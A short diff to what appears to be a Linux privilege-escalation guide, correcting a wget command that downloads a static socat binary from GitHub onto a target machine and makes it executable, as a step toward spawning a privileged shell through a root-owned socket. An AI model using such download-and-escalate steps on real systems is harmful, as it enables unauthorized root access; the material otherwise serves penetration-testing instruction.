@@ -156,7 +156,7 @@ When an application creates a socket running under root it is possible to send c
 If the target machine does not have socat installed execute the following command
 
 ```
-wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat && chmod +x ./socat
+wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true && chmod +x ./socat
 ```
 
 Run the application to spawn the socket then execute the following commands to spawn a privileged shell
